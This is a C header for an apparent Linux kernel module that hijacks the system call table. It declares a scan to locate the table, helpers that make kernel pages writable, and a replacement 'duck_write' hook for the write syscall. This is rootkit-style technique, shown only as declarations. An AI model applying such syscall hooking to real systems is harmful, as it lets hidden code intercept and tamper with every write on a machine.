#ifndef _HIJACK_H_
#define _HIJACK_H_

//#include <asm/semaphore.h>
#include <asm/cacheflush.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/slab.h>

#if defined(__i386__)
    #define SCT_START_CHECK 0xc0000000
    #define SCT_END_CHECK   0xd0000000
    typedef unsigned int ptr_t;
#else
    #define SCT_START_CHECK 0xffffffff81000000
    #define SCT_END_CHECK   0xffffffffa2000000
    typedef unsigned long ptr_t;
#endif

ptr_t find_syscall_table(void);
int set_page_rw(ptr_t address);
int set_page_ro(ptr_t address);

extern asmlinkage ssize_t (*original_write)(int fd, const char __user *buff, ssize_t count);
asmlinkage ssize_t duck_write(int fd, const char __user *buff, ssize_t count);

#endif /* _HIJACK_H_ */